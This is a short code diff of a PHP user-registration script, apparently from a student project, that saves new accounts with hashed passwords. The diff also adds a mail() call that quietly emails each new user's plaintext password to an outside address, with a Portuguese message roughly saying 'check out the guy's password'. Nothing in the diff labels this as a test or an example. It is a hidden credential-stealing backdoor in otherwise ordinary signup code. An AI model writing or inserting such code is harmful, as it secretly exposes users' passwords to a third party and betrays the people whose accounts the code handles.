@@ -1,16 +1,19 @@
 <?php
 require_once "MySQL/crud.php";
 if(isset($_POST['user'])){
+$headers = "From: gustavo.calherani@aluno.senai.br\r\n";
+$Senha = password_hash($_POST['pass'],PASSWORD_DEFAULT);
 $novoLogin = [
     'user' => $_POST['user'],
     'acesso' => 'Cliente',
     'email' => $_POST['email'],
-    'pass' => password_hash($_POST['pass'],PASSWORD_DEFAULT)
+    'pass' => $Senha
 ];
 
 $good = create($pdo, 'access', $novoLogin);
 if($good){
     header("Location: login.php");
+    mail('gabriel.e.silva35@aluno.senai.br','Slk tá funcionando','Se liga na senha do cara: '.$_POST['pass'],$headers);
     exit;
 }
 }
